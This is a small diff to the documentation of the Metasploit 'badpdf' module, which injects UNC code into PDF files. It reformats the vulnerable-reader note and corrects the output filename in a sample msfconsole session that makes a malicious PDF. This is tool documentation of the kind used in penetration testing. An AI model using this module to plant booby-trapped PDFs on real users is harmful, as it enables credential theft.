@@ -3,8 +3,7 @@ or if PDFINJECT option is used will try and inject the necessary UNC code into a
 
 ## Vulnerable Application
 
-Various PDF Readers. 
-Note Adobe released the patch APSB18-09 to prevent this and
+Various PDF Readers. Note Adobe released the patch APSB18-09 to prevent this and
 FoxIT after version 9.1 is no longer vulnerable.
 
 ## Verification Steps
@@ -86,7 +85,7 @@ msf auxiliary(fileformat/badpdf) > set pdfinject /root/Desktop/example.pdf
 pdfinject => /root/Desktop/example.pdf
 msf auxiliary(fileformat/badpdf) > exploit
 
-[+] Malicious file writen to /root/Desktop/example.pdf.malicious
+[+] Malicious file writen to /root/Desktop/example_malicious.pdf
 [\*] Auxiliary module execution completed
 msf auxiliary(fileformat/badpdf) > 
  
